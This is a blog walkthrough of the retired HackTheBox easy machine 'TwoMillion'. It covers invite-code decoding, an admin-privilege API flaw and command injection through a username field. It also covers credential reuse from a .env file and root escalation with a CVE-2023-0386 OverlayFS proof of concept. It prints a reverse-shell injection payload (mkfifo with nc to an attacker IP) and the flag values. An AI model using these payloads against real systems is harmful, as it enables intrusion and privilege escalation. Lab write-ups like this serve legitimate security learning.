---
title: "TwoMillion"
description: "Another Medium! Hopefully it doesn't kick my ass as much..."
pubDate: 2024-01-05
author: "sealldev"
section: "HackTheBox"
image: "images/htb/box/twomillion/icon.png"
tags: ["easy", "hackthebox-machine"]
---

3 machines today! Another retired easy to top today off.

**Machine created by:** [TheCyberGeek](https://app.hackthebox.com/users/114053)

## Recon

Let's start with a nmap port scan:

```
$ sudo nmap 10.10.11.221 --top-ports 2500
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 08:20 AEDT
Nmap scan report for 10.10.11.221
Host is up (0.015s latency).
Not shown: 2498 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Let's setup an entry in `/etc/hosts`

```
10.10.11.221 2million.htb
```

The page is a mimic of old HTB.

![Home](images/htb/box/twomillion/home.png)

I use dirstalk with the `common.txt` wordlist from SecLists to find some file paths:

```
$ dirstalk scan --dictionary common.txt "http://2million.htb/" --http-statuses-to-ignore 404,403,301
...
http://2million.htb/invite [200] [GET]
```

Visiting `/invite` I see a replica of the HackTheBox invite code challenge.

![Invite](images/htb/box/twomillion/invite.png)

I open the source code, and read the `inviteapi.min.js` file, and see `makeInviteCode`.

```js
eval(
  function (p, a, c, k, e, d) {
    e = function (c) {
      return c.toString(36)
    };
    if (!''.replace(/^/, String)) {
      while (c--) {
        d[c.toString(a)] = k[c] ||
        c.toString(a)
      }
      k = [
        function (e) {
          return d[e]
        }
      ];
      e = function () {
        return '\\w+'
      };
      c = 1
    };
    while (c--) {
      if (k[c]) {
        p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
      }
    }
    return p
  }(
    '1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,
    24,
    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),
    0,
    {
    }
  )
)
```

Running that command in console gives an 'encrypted' response:

```
>> makeInviteCode()
Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
​
0: 200
​
data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
​
hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
​
success: 1
​
<prototype>: Object { … }
inviteapi.min.js line 1 > eval:1:372
``` 

`Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr` (which is ROT13), decoded to: `In order to generate the invite code, make a POST request to /api/v1/invite/generate`

After sending a post request to that endpoint, I'm given a base64 encoded invite code, that once decoded resolves to: `WF214-GBGCQ-Q2YS6-10BQ2` which I can submit to register.

Once registered I login.

![Login](images/htb/box/twomillion/login.png)

![Dashboard](images/htb/box/twomillion/dash.png)

I got a bit stuck here poking around, I could find a VPN download at `/home/access` and the changelog at `/home/changelog`.

Looking at each of the endpoints we found with dirstalk, visiting `/api/v1` lists all of the endpoints!

```json
{
    "v1": {
        "user": {
            "GET": {
                "/api/v1": "Route List",
                "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
                "/api/v1/invite/generate": "Generate invite code",
                "/api/v1/invite/verify": "Verify invite code",
                "/api/v1/user/auth": "Check if user is authenticated",
                "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
                "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
                "/api/v1/user/vpn/download": "Download OVPN file"
            },
            "POST": {
                "/api/v1/user/register": "Register a new user",
                "/api/v1/user/login": "Login with existing user"
            }
        },
        "admin": {
            "GET": {
                "/api/v1/admin/auth": "Check if user is admin"
            },
            "POST": {
                "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
            },
            "PUT": {
                "/api/v1/admin/settings/update": "Update user settings"
            }
        }
    }
}
```

None of the `user` api's have gotten us anywhere, let's try the admin ones!

`/api/v1/admin/auth` gives us this quite *exhilerating* response:

```json
{
    "message":false
}
```

`/api/v1/admin/vpn/generate` returns `401 Unauthorized`

`/api/v1/admin/settings/update` gives us a more interesting response:

```json
{
    "status":"danger",
    "message":"Invalid content type."
}
```

## Exploitation

Interesting! Let's try adding `Content-Type: application/json`:

```json
{
    "status":"danger",
    "message":"Missing parameter: email"
}
```

Rightio seems we're getting somewhere! I set my body to `{"email":"<registered email>"}`

```json
{
    "status":"danger",
    "message":"Missing parameter: is_admin"
}
```

I add `"is_admin":true` to my body:

```json
{
    "status":"danger",
    "message":"Variable is_admin needs to be either 0 or 1."
}
```

I change my body to `{"email":"<registered email>","is_admin":1}`:

```json
{
    "id":29,
    "username":"test2",
    "is_admin":1
}
```

Awesome! Now visiting `/api/v1/admin/auth` returns:

```json
{
    "message":true
}
```

Now requesting to `/api/v1/admin/vpn/generate` returns a new error:

```json
{
    "status":"danger",
    "message":"Invalid content type."
}
```

Now we go through the same process, until we reach this payload:

```json
{
    "username":"test2"
}
```

Now what? We can't really use this VPN file, there's no other endpoints...

I found that inserting a `;` in the username field seems to cause a response change, so perhaps we can cause some command injection.

We can get a reponse doing the following:

```json
{
    "username":"test2;whoami;"
}
```

We get a response of: `www-data`!

## Initial Access & User Flag

Let's see if we can trigger a reverse shell, I setup my listener with `pwncat`.

```
$ pwncat-cs
[16:41:49] Welcome to pwncat 🐈!
(local) pwncat$ listen --host 10.10.***.*** 4444 -m linux
[16:41:53] new listener created for 10.10.***.***:4444
(local) pwncat$
```

I generate a reverse shell payload using RevShells and use this:

```json
{
    "username": "test2;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.***.*** 4444 >/tmp/f;"
}
```

And we get a callback!

```
[15:47:37] 10.10.11.221:32780: registered new host w/ db
[15:47:38] listener: 10.10.***.***:4444: linux session from 10.10.11.221:32780
           established
```

Once inside, after running `ls` I see a `Database.php`:

```php
class Database
{
    private $host;
    private $user;
    private $pass;
    private $dbName;

    private static $database = null;

    private $mysql;

    public function __construct($host, $user, $pass, $dbName)
    {
        $this->host     = $host;
        $this->user     = $user;
        $this->pass     = $pass;
        $this->dbName   = $dbName;

        self::$database = $this;
    }

    public static function getDatabase(): Database
    {
        return self::$database;
    }

    public function connect()
    {
        $this->mysql = new mysqli($this->host, $this->user, $this->pass, $this->dbName);
    }

    public function query($query, $params = [], $return = true)
    {
        $types = "";
        $finalParams = [];

        foreach ($params as $key => $value)
        {
            $types .= str_repeat($key, count($value));
            $finalParams = array_merge($finalParams, $value);
        }

        $stmt = $this->mysql->prepare($query);
        $stmt->bind_param($types, ...$finalParams);

        if (!$stmt->execute())
        {
            return false;
        }

        if (!$return)
        {
            return true;
        }

        return $stmt->get_result() ?? false;
    }
}
```

I see its using private variables for the host and password of the database, so I use `printenv` to see if its there.

Nothing... and then I run `ls -lha` and see `.env` file.

```
(remote) www-data@2million:/var/www/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Perfect, lets login.

```
$ ssh admin@2million.htb
admin@2million.htb's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
...
admin@2million:~$ cat /home/admin/user.txt
518f29b33469fb35e4c4303164b0f539
```

There's the user flag! 

Flag: `518f29b33469fb35e4c4303164b0f539`

## Root Flag

Running `linpeas.sh` from LinPEAS (once uploaded from a local http server) shows some interesting entries for Mail:

```
...
╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/mail/admin
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/spool/mail/admin
...
```

Reading `/var/mail/admin` gives us an email:

```
$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

So there's some kernel exploits! Looking for OverlayFS / FUSE CVE PoC finds [CVE-2023-0386](https://github.com/sxlmnwb/CVE-2023-0386).

I downloaded the repo, put it all in a ZIP and downloaded the zip from a python webserver to the box.

Once unzipped I ran `make all` to construct the exploit:

```
$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

I then ran `./fuse ./ovlcap/lower ./gc` in my first shell, opened a new SSH instance with the user `admin` and ran `./exp`.

```
$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
```

```
$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jan  5 07:20 .
drwxr-xr-x 6 root   root     4096 Jan  5 07:20 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
# cat /root/root.txt
f47df46ad586c28aa025a48f2e961c83
```

And there's our root flag! 

Flag: `f47df46ad586c28aa025a48f2e961c83`

![Success](images/htb/box/twomillion/submitted.png)